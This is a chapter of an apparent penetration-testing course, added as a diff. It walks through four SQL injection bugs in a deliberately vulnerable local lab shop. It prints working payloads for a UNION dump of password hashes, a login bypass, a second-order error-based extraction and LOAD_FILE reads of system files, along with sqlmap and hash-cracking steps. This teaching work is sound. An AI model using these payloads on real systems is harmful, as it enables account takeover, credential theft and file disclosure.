@@ -1,0 +1,62 @@
+<?xml version='1.0' encoding='utf-8'?>
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta charset="utf-8"/>
+<title>Session 2: SQL Injection, Four Ways</title>
+<link rel="stylesheet" type="text/css" href="../styles.css"/>
+</head>
+<body>
+<h1>Session 2: SQL Injection, Four Ways</h1>
+<p>Goal for this session: exploit all four of Widgetorium's SQL injection bugs and understand why they are four separate bugs and not one. Two of them a scanner hands you. One of them a scanner will never find. One of them is really two bugs sharing an endpoint. By the end you will have the admin's password hash and a file read off the database host.</p>
+<h2>2.1 The Search Box: UNION-Based, Reads Any Table</h2>
+<p>The storefront search concatenates your term straight into a <code>LIKE</code> clause, and it selects three columns, so a <code>UNION SELECT</code> lines up cleanly.</p>
+<pre>curl -s "http://127.0.0.1:8080/search.php?q=x' UNION SELECT username,password_hash,role FROM users-- -"</pre>
+<p>The results table now lists every account and its unsalted MD5 hash. Hand that to <code>sqlmap</code> to see it work the problem systematically:</p>
+<pre>sqlmap -u 'http://127.0.0.1:8080/search.php?q=x' --batch --dbs
+sqlmap -u 'http://127.0.0.1:8080/search.php?q=x' --batch -D widgetorium -T users --dump</pre>
+<p>Then take the hashes to <code>john</code> or <code>hashcat</code> with a rockyou-class wordlist. The seed passwords are all in it. This is where a trainee first feels the difference between "the scanner said injectable" and "I have the admin's password."</p>
+<h2>2.2 The Login Form: Authentication Bypass</h2>
+<p>The login query concatenates both the username and the password hash. The classic payload in the username field returns the first row in the table, which is the seed admin.</p>
+<pre>curl -si --data-urlencode "username=' OR '1'='1' -- " --data "password=x" \
+     http://127.0.0.1:8080/login.php</pre>
+<p>You get a <code>302</code> to <code>/account.php</code> and a <code>Set-Cookie: WIDGET_SESSID=</code>. You are now the administrator. Do this one by hand before you automate anything; the mechanism, a quote that closes the string and a comment that eats the rest of the query, is the thing to internalise.</p>
+<p>Look closely at the cookie you were handed. It will matter in Session 4.</p>
+<h2>2.3 Second-Order: The Payload That Waits</h2>
+<p>This is the one ZAP will not find, and it is the most instructive bug in the lab.</p>
+<p>The admin product form stores the product name through a parameterised query. Quotes and SQL metacharacters go into the <code>name</code> column byte for byte, and nothing happens. No error, no reflection, no scanner alert. The payload just sits in the catalogue looking like a badly named product.</p>
+<p>Later, an administrator opens the inventory report. That page loops over every stored product name and concatenates each one into a fresh query against a stock-ledger table. The dormant payload fires there. Because the report fetches a single row per product, a plain <code>UNION</code> hides behind the aggregate's first row, so use an error-based payload and read the data out of the error message the report prints.</p>
+<p>As the admin, create a product with this name:</p>
+<pre>zz' AND updatexml(1,concat(0x7e,(SELECT concat(username,0x3a,password_hash)
+    FROM users ORDER BY id LIMIT 1)),1)-- -</pre>
+<p>The storefront still looks normal. Open <code>/admin/inventory_report.php</code> and that row's "on hand" cell reads:</p>
+<pre>(error) ... XPATH syntax error: '~admin:042af043eff3ad41868f9ccdf'</pre>
+<p>Walk <code>LIMIT 1,1</code>, <code>LIMIT 2,1</code> for the rest of the table. The teaching point: data already in your database is still untrusted input. Sanitising on the way in is not the same as parameterising the query that reads it back out.</p>
+<h2>2.4 The Price API: Injection and Broken Authorisation in One Endpoint</h2>
+<p>The <code>api/update_item.php</code> endpoint takes a JSON body of <code>{id, price, qty}</code> and updates a product. It has two independent bugs.</p>
+<h3>The authorisation half</h3>
+<p>Any logged-in user can call it. There is no check that the product belongs to the caller and no admin-role check. Log in as the customer <code>alice</code> and edit a product she does not own:</p>
+<pre>curl -s -b alice.jar -H 'Content-Type: application/json' \
+     -d '{"id":7,"price":0.01}' \
+     http://127.0.0.1:8080/api/update_item.php</pre>
+<p>The response confirms the change and shows your role as <code>customer</code>. That is an IDOR: the object reference, <code>id</code>, is under your control and nothing checks whether you should be allowed to touch it.</p>
+<h3>The injection half</h3>
+<p>Inject on <code>id</code>. It flows into <code>WHERE id = &lt;id&gt;</code>. The <code>price</code> and <code>qty</code> fields land in numeric columns that truncate any string you get back, so <code>id</code> is your extraction point. The database user holds the <code>FILE</code> privilege and <code>secure_file_priv</code> is empty, so <code>LOAD_FILE</code> works:</p>
+<pre>curl -s -b alice.jar -H 'Content-Type: application/json' -d '{
+  "id": "7 OR updatexml(1,concat(0x7e,(SELECT LEFT(LOAD_FILE(0x2f7661722f6c69622f6d7973716c2d66696c65732f7365637265742e747874),40))),1)",
+  "price": "1.00"
+}' http://127.0.0.1:8080/api/update_item.php</pre>
+<p>The verbose SQL-error block comes back with the first bytes of the file. Note the scope: <code>LOAD_FILE</code> reads the <em>database container's</em> filesystem, not the web server's. Good targets from there are <code>/etc/passwd</code>, <code>/etc/hostname</code>, and the MySQL config. <code>sqlmap</code> will drive this with <code>--data '{"id":"7*","price":"1"}'</code>.</p>
+<h2>2.5 Why Four Bugs</h2>
+<table>
+<thead><tr><th>#</th><th>Where</th><th>Scanner finds it?</th><th>Real lesson</th></tr></thead>
+<tbody>
+<tr><td>1</td><td>search box</td><td>yes, active scan</td><td>UNION structure, then crack what you dumped</td></tr>
+<tr><td>2</td><td>login form</td><td>sometimes</td><td>string break plus comment; do it by hand once</td></tr>
+<tr><td>3</td><td>admin report</td><td>no</td><td>stored data is still input; error-based when the sink fetches one row</td></tr>
+<tr><td>4</td><td>price API</td><td>injection yes, authz no</td><td>two bugs, one endpoint; pick the parameter that actually exfiltrates</td></tr>
+</tbody>
+</table>
+<p>Every one of these is "SQL injection" in a report heading, and every one needs a different head to exploit. The fix for all four is the same sentence, parameterise the query and never build SQL by concatenation, but you cannot write that fix with confidence until you have felt why the generic advice keeps not being followed.</p>
+</body>
+</html>
